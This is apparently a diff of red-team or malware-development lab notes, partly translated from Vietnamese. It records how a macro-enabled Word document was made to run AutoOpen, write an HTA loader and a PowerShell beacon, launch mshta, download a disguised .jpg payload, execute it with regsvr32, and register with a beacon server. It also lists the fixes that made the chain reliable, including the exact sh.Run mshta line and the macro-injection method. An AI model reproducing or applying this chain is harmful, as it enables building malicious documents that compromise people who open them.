+  at 02:25/03:20/03:45/03:53; d6 opened at 03:56 with zero actions). Macro execution **depends on
+  the Word instance** — the failure is not in the WriteFiles code.
+- The Application log shows no Word errors (no crash/dialog logged); VBAWarnings/AccessVBOM/ProtectedView
+  were all set.
+- d5 (test.docm with pub wiped) → beacon registered at 03:53:36 — suggesting WriteFiles can run on a
+  clean slate, though not yet reproducible.
+- diag3 (native I/O) also produced 0 output on the non-running instance ⇒ the problem sits at the
+  "does the macro run at all" layer, not in the write code.
 
-## 10. Goal #3 — docm TỰ SINH HẾT PAYLOAD TỪ ĐẦU: SOLVED (2026-10-02, verified)
+**Conclusion**: the reliable mode is the seed fallback (proven many times). For "entry 100% from
+the macro": the console UI of Word in the duc.user session must be observed (to catch a hidden
+dialog / first-run prompt) or a manual open used; the WriteFiles code was rewritten toward native
+I/O (COM-failure resistant) and is ready for re-validation.
 
-RUN chứng minh 05:05Z: mở c0015_goal3.docm (manual victim-open, auto-macro) →
-macro (AutoOpen, standard module) tự viết config.ini(1734)/bootstrap.hta(4358)/c0015_beacon.ps1(6093)
-(E11 proc=WINWORD) → mshta chạy HTA → download c0015-comparefor.jpg(90407) → regsvr32 → dll-executed →
-beacon register phase3 (token a7d4f6e1, ok=True). c0015wf.log ghi từng bước WriteFiles err=0.
+## 10. Objective #3 — document self-generates the full payload set: RESOLVED (2026-10-02, verified)
 
-4 root cause đã sửa (commit 422ed91):
-1. installer dùng `$doc.VBProject` thay `$word.VBE.ActiveVBProject` (trước: project rơi vào Normal.dotm →
-   docm lưu KHÔNG macro);
-2. inject vào STANDARD MODULE 'c0015Payload' (ThisDocument derive Document → collision member → "member
-   already exists");
-3. module emission viết lại sạch từ generator (hết junk sau End Sub; sửa `sh.Run` quote-soup → `sh.Run
-   mshtaPath & " " & htaPath, 0, False`);
-4. trigger = `Public Sub AutoOpen()` duy nhất (standard module).
+Proof run 05:05Z: opened c0015_entry.docm (manual victim open, auto-macro) →
+the macro (AutoOpen, standard module) writes config.ini(1734)/bootstrap.hta(4358)/c0015_beacon.ps1(6093)
+itself (E11 proc=WINWORD) → mshta runs the HTA → downloads c0015-comparefor.jpg(90407) → regsvr32 →
+dll-executed → beacon registers phase3 (token a7d4f6e1, ok=True). c0015wf.log records every WriteFiles
+step, err=0.
 
-Điều kiện lab cần nhớ: victim-open MANUAL (Word session interactive), Word sạch (xoá Resiliency/DocumentRecovery
-sau crash trước khi mở), auto-macro bật. Ghi chú: đôi khi mshta hiện "script error: write to file failed
-(code 0)" thoáng qua ở bước ghi marker nhưng file vẫn ghi thành công (E11 xác nhận) - script tiếp tục chạy.
+Four root causes remediated (commit 422ed91):
+1. the installer uses `$doc.VBProject` instead of `$word.VBE.ActiveVBProject` (previously the project
+   landed in Normal.dotm → the docm was saved macro-less);
+2. injection into a STANDARD MODULE 'c0015Payload' (ThisDocument derives from Document → member
+   collision → "member already exists");
+3. the module emission was rewritten cleanly in the generator (no junk after End Sub; `sh.Run`
+   quote-soup → `sh.Run mshtaPath & " " & htaPath, 0, False`);
+4. trigger = single `Public Sub AutoOpen()` (standard module).
 
-
-
+Lab requirements to remember: victim open is MANUAL (interactive Word session), the Word state must
+be clean (delete Resiliency/DocumentRecovery after a crash before opening), auto-macros enabled.
+Note: occasionally mshta shows a transient "script error: write to file failed (code 0)" while
+writing the marker, but the file is written successfully anyway (confirmed by E11) and the script
+continues.
